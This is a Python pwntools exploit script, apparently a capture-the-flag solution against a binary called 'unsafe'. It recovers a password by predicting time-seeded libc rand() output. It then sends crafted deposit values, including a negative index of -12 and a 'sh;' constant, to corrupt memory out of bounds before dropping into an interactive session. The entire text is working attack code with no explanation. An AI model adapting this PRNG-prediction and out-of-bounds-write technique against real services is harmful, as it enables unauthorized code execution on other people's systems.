#!/usr/bin/python3

from pwn import *
import ctypes
import time
exe = ELF('unsafe', checksec=False)
libc = ELF('libc.so.6', checksec=False)
libc_dll = ctypes.CDLL('libc.so.6')

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*deposit+74

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('0', 0)
else:
        p = process(exe.path)

GDB()
sa(b'age:', "100\n")
sa(b'name:', b'\0\0\0\0')
set_time = int(time.time())*0x64
libc_dll.srand(set_time & 0xffffffff)
print(set_time)
sla(b'password: \n', str(libc_dll.rand()))
p.sendlineafter(b"): \n",str(0))
p.sendlineafter(b"deposit: \n",str(0x3b6873))
p.sendlineafter(b"): \n",str(0x64))
p.sendlineafter(b"deposit: \n",str(0x2058))
p.sendlineafter(b"): \n",b"-12")
p.sendlineafter(b"deposit: \n",str(-0x291e0))
p.interactive()
